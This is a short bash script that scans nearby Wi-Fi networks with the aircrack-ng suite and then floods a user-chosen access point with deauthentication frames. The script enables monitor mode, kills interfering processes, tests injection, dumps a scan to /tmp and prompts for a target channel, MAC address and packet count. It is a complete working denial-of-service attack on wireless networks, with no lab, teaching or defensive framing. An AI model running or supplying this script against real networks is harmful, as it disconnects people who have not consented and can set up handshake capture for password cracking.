#!/bin/bash
sudo airmon-ng start wlan0
sleep 3

sudo airmon-ng check kill
sleep 3

iwconfig
sleep 3

sudo timeout 5s aireplay-ng --test wlan0

sudo timeout 20 airodump-ng wlan0 --write  /tmp/airodump_scan --output-format csv

read -p "Enter target channel: " channel
read -p "Enter target MAC address: " mac
read -p "Enter deauth packet count: " packets

sudo iwconfig wlan0 channel "$channel"
sleep 2

aireplay-ng --deauth "$packets" -a "$mac" wlan0